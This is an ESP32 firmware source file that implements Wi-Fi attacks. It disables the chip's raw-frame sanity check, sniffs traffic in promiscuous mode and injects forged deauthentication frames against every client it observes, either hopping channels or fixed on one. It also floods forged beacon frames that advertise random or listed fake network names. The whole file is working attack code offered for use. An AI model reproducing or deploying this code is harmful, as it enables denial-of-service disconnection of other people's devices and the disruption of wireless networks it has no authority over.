#include "attack.h"

char emptySSID[32];

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
{
  return 0;
}

static const wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};

struct __attribute__((packed))
{
  uint8_t  fc[2] = {0xC0, 0x00};
  uint8_t  dur[2];
  uint8_t  sta[6];
  uint8_t  src[6];
  uint8_t  ap[6];
  uint8_t  seq[2] = {0xF0, 0xFF};
  uint16_t reason = 0x01;
} deauth;

struct __attribute__((packed))
{
  uint8_t fc[2]  = {0x80, 0x00};
  uint8_t dur[2] = {0x00, 0x00};
  uint8_t dst[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t seq[2]       = {0x00, 0x00};
  uint8_t timestamp[8] = {0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00};
  uint8_t interval[2]  = {0xe8, 0x03};
  uint8_t cap[2]       = {0x31, 0x00};
  uint8_t ssid_tag     = 0x00;
  uint8_t ssid_len     = 0x20;
  uint8_t ssid[32];
  uint8_t rates_tag   = 0x01;
  uint8_t rates_len   = 0x08;
  uint8_t rates[8]    = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  uint8_t channel_tag = 0x03;
  uint8_t channel_len = 0x01;
  uint8_t channel;
  uint8_t rsn_tag      = 0x30;
  uint8_t rsn_len      = 0x18;
  uint8_t rsn_data[24] = {0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};
} beacon;

void sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t                *mac = pkt->payload + 4;
  if ( memcmp(mac, mac + 12, 6) == 0 && memcmp(mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) )
  {
    memcpy(deauth.sta, mac + 6, 6);
    memcpy(deauth.ap, mac, 6);
    memcpy(deauth.src, mac, 6);
    digitalWrite(2, HIGH);
    delay(15);
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
    digitalWrite(2, LOW);
  }
}

void send_beacon(const char ssidArray[][33], uint16_t count, int MacSeed)
{
  uint8_t mac[6];
  mac[0]          = 0x00;
  uint8_t channel = (MacSeed % 13) + 1;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for ( int number = 0; number < count; number++ )
  {
    for ( int j = 1; j < 6; j++ )
      mac[j] = ((number + 1) * MacSeed * j) % 256;
    mac[5] = number & 0xFF;
    memcpy(beacon.src, mac, 6);
    memcpy(beacon.bssid, mac, 6);
    const char *ssid = ssidArray[number];
    int         len  = strlen(ssid);
    if ( len > 32 )
      len = 32;
    memcpy(beacon.ssid, emptySSID, 32);
    memcpy(beacon.ssid, ssid, len);
    beacon.channel = channel;
    for ( int i = 0; i < 3; i++ )
    {
      esp_wifi_80211_tx(WIFI_IF_STA, &beacon, sizeof(beacon), 0);
      delay(1);
    }
  }
}

void wifi_deauth_all()
{
  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  bool SerialStop = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    for ( int channel = 0; channel < 14; channel++ )
    {
      btnNext.tick();
      btnOK.tick();
      btnPrevious.tick();
      SerialStop = SerialCommands();
      delay(10);
      esp_wifi_set_channel(channel + 1, WIFI_SECOND_CHAN_NONE);
      if ( !SerialStop )
        break;
    }
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = prefs.getString("ssid", default_ssid);
  String current_password = prefs.getString("password", default_password);
  if ( access_point == 0 )
    WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}

void wifi_deauth_scan()
{
  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  int  scanCounter = 0;
  bool SerialStop  = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    if ( scanCounter >= 600 )
    {
      esp_wifi_set_promiscuous(false);
      NumberChannels = scan_wifi_APs(WiFiScanChannels, true);
      scanCounter    = 0;
      esp_wifi_set_promiscuous(true);
    }
    for ( int chIndex = 0; chIndex < NumberChannels; chIndex++ )
    {
      int wifiChannel = WiFiScanChannels[chIndex];
      btnNext.tick();
      btnOK.tick();
      btnPrevious.tick();
      SerialStop = SerialCommands();
      delay(10);
      esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
      if ( !SerialStop )
        break;
    }
    scanCounter++;
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = prefs.getString("ssid", default_ssid);
  String current_password = prefs.getString("password", default_password);
  if ( access_point == 0 )
    WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}

void wifi_deauth_channel(int channel)
{
  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous_filter(&filter);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  bool SerialStop = true;

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    btnNext.tick();
    btnOK.tick();
    btnPrevious.tick();
    SerialStop = SerialCommands();
    delay(10);
    if ( !SerialStop )
      break;
  }
  esp_wifi_set_promiscuous(false);
  String current_ssid     = prefs.getString("ssid", default_ssid);
  String current_password = prefs.getString("password", default_password);
  if ( access_point == 0 )
    WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}

void wifi_beacon_spam_random()
{
  char buffer[50][33];
  bool SerialStop = true;
  int  MacSeed    = esp_random();

  memset(emptySSID, ' ', sizeof(emptySSID));
  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  digitalWrite(2, HIGH);

  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    btnNext.tick();
    btnOK.tick();
    btnPrevious.tick();
    SerialStop = SerialCommands();

    randomSeed(esp_random() + millis());

    for ( int i = 0; i < 50; i++ )
    {
      uint8_t len = random(8, 29);
      for ( int k = 0; k < len; k++ )
      {
        uint8_t r = random(0, 62);
        if ( r < 26 )
          buffer[i][k] = 'A' + r;
        else if ( r < 52 )
          buffer[i][k] = 'a' + (r - 26);
        else
          buffer[i][k] = '0' + (r - 52);
      }
      buffer[i][len] = '\0';
    }

    send_beacon(buffer, 50, MacSeed);

    if ( !SerialStop )
      break;
  }

  digitalWrite(2, LOW);
  String current_ssid     = prefs.getString("ssid", default_ssid);
  String current_password = prefs.getString("password", default_password);
  if ( access_point == 0 )
    WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}

void wifi_beacon_spam_array()
{
  uint16_t count      = 0;
  bool     SerialStop = true;
  int      MacSeed    = esp_random();
  memset(emptySSID, ' ', sizeof(emptySSID));
  for ( int i = 0; i < 100; i++ )
  {
    if ( SSIDs_Array[i][0] == '\0' )
      break;
    count = i + 1;
  }
  if ( access_point == 0 )
    WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  btnNext.tick();
  btnOK.tick();
  btnPrevious.tick();
  digitalWrite(2, HIGH);
  while ( (!btnNext.isSingle() && !btnPrevious.isSingle() && !btnOK.isDouble() && !btnOK.isSingle()) && SerialStop )
  {
    btnNext.tick();
    btnOK.tick();
    btnPrevious.tick();
    SerialStop = SerialCommands();
    randomSeed(esp_random() + millis());
    send_beacon(SSIDs_Array, count, MacSeed);
    if ( !SerialStop )
      break;
  }
  digitalWrite(2, LOW);
  String current_ssid     = prefs.getString("ssid", default_ssid);
  String current_password = prefs.getString("password", default_password);
  if ( access_point == 0 )
    WiFi.softAP(current_ssid.c_str(), current_password.c_str());
}